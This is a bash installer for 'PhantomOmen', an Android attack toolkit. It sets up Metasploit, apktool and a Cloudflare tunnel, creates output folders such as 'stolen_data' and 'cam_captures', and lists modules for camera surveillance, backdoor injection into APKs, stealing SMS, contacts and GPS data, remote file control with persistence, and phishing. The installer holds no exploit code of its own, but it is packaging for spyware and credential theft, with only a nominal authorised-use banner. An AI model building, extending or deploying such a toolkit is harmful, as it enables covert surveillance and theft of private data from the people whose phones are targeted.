#!/bin/bash
#
# PhantomOmen - Ultimate Android Penetration Toolkit
# Installer for Kali Linux, Ubuntu, Termux, Arch
#

GREEN='\033[92m'
CYAN='\033[96m'
YELLOW='\033[93m'
RED='\033[91m'
MAGENTA='\033[95m'
RESET='\033[0m'

clear
echo -e "${RED}"
echo "██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗"
echo "██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║"
echo "██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║"
echo "██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║"
echo "██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║"
echo "╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝"
echo -e "${GREEN}         Ultimate Android Penetration Toolkit v3.0${RESET}"
echo -e "${CYAN}         Authorized Security Testing Only${RESET}"
echo ""

# Detect platform
if [ -d "/data/data/com.termux" ] || echo "$PREFIX" | grep -q "com.termux"; then
    echo -e "${GREEN}[*] Platform: Termux (Android)${RESET}"
    IS_TERMUX=true
    PKG_MGR="pkg"
elif [ -f "/etc/debian_version" ]; then
    echo -e "${GREEN}[*] Platform: Debian/Ubuntu/Kali${RESET}"
    IS_TERMUX=false
    PKG_MGR="apt"
elif [ -f "/etc/arch-release" ]; then
    echo -e "${GREEN}[*] Platform: Arch Linux${RESET}"
    IS_TERMUX=false
    PKG_MGR="pacman"
else
    echo -e "${GREEN}[*] Platform: Linux (generic)${RESET}"
    IS_TERMUX=false
    PKG_MGR="apt"
fi

# Update packages
echo -e "${YELLOW}[*] Updating package lists...${RESET}"
if [ "$IS_TERMUX" = true ]; then
    pkg update -y
elif [ "$PKG_MGR" = "apt" ]; then
    sudo apt update -y 2>/dev/null || apt update -y
elif [ "$PKG_MGR" = "pacman" ]; then
    sudo pacman -Sy --noconfirm
fi

# Install dependencies
echo -e "${YELLOW}[*] Installing core dependencies...${RESET}"
if [ "$IS_TERMUX" = true ]; then
    pkg install -y python python-pip git curl wget nmap openssl php \
        apktool metasploit zipalign gradle aapt 2>/dev/null || {
        echo -e "${YELLOW}[!] Some packages may not be available. Installing essential...${RESET}"
        pkg install -y python python-pip git curl wget openssl
    }
elif [ "$PKG_MGR" = "apt" ]; then
    sudo apt install -y python3 python3-pip git curl wget nmap openssl \
        apktool default-jdk zipalign android-sdk 2>/dev/null || {
        echo -e "${YELLOW}[!] Installing essential packages...${RESET}"
        sudo apt install -y python3 python3-pip git curl wget
    }
elif [ "$PKG_MGR" = "pacman" ]; then
    sudo pacman -S --noconfirm python python-pip git curl wget nmap openssl \
        jdk-openjdk android-tools 2>/dev/null
fi

# Install Python packages
echo -e "${YELLOW}[*] Installing Python packages...${RESET}"
pip install --upgrade pip
pip install requests colorama dnspython pycryptodome 2>/dev/null || {
    pip install requests colorama dnspython
}

# Install cloudflared for tunneling
echo -e "${YELLOW}[*] Installing Cloudflared tunnel...${RESET}"
if ! which cloudflared >/dev/null 2>&1; then
    if [ "$IS_TERMUX" = true ]; then
        pkg install -y cloudflared 2>/dev/null || \
        echo -e "${YELLOW}[!] cloudflared not in Termux repos. Install manually.${RESET}"
    else
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /tmp/cloudflared
        chmod +x /tmp/cloudflared
        sudo mv /tmp/cloudflared /usr/local/bin/cloudflared 2>/dev/null || \
        mv /tmp/cloudflared /usr/local/bin/cloudflared 2>/dev/null
        echo -e "${GREEN}[+] Cloudflared installed!${RESET}"
    fi
fi

# Create directories
mkdir -p output/cam_captures output/stolen_data output/downloads output/screenshots
chmod -R 755 output

# Make launcher executable
chmod +x phantomomen.py

# Create symlink
if [ "$IS_TERMUX" != true ] && [ -d "/usr/local/bin" ]; then
    ln -sf "$(pwd)/phantomomen.py" /usr/local/bin/phantomomen 2>/dev/null && \
    echo -e "${GREEN}[+] Symlink created: phantomomen${RESET}"
fi

echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════════╗${RESET}"
echo -e "${GREEN}║       PhantomOmen Installed Successfully! 🚀     ║${RESET}"
echo -e "${GREEN}╚══════════════════════════════════════════════════╝${RESET}"
echo ""
echo -e "${CYAN}Available Modules:${RESET}"
echo -e "  ${YELLOW}[1]${RESET} 🎯 ${GREEN}CamHack${RESET}      - Camera Exploitation & Surveillance"
echo -e "  ${YELLOW}[2]${RESET} 💣 ${GREEN}APK Binder${RESET}   - Backdoor Injection into Any APK"
echo -e "  ${YELLOW}[3]${RESET} 📡 ${GREEN}PhantomGrab${RESET}  - SMS, Contacts, GPS, Files Info Stealer"
echo -e "  ${YELLOW}[4]${RESET} 🔐 ${GREEN}FileControl${RESET}  - Remote File Manager & Persistence"
echo -e "  ${YELLOW}[5]${RESET} 🧠 ${GREEN}Social Engineer${RESET} - Phishing Toolkit"
echo ""
echo -e "${CYAN}Quick Start:${RESET}"
echo -e "  python3 phantomomen.py           ${DIM}# Interactive menu${RESET}"
echo -e "  python3 phantomomen.py -m camhack ${DIM}# Direct: CamHack${RESET}"
echo ""
